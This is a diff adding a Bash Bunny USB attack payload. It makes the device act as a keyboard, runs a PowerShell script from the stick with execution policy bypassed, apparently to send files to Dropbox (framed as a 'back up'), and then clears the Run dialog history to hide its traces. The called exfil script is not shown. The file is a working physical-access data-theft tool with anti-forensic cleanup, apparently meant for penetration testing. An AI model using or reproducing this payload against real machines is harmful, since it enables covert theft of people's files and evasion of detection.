@@ -1,0 +1,24 @@
+#!/bin/bash
+#Scripter: Ryan_Van_Mass
+#Credit: Hak5Darren
+#Description: "Back Up" files to Dropbox
+
+############## SETUP ##############
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+sleep 1
+
+############## ATTACK ##############
+LED ATTACK
+RUN WIN "powershell -Exec Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\exfil.ps1')"
+sleep 30
+
+############## CLEAN UP ##############
+LED CLEANUP
+#Removes Run Line Entry
+RUN WIN "powershell Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK DELAY 500
+
+############## DONE ##############
+LED FINISH
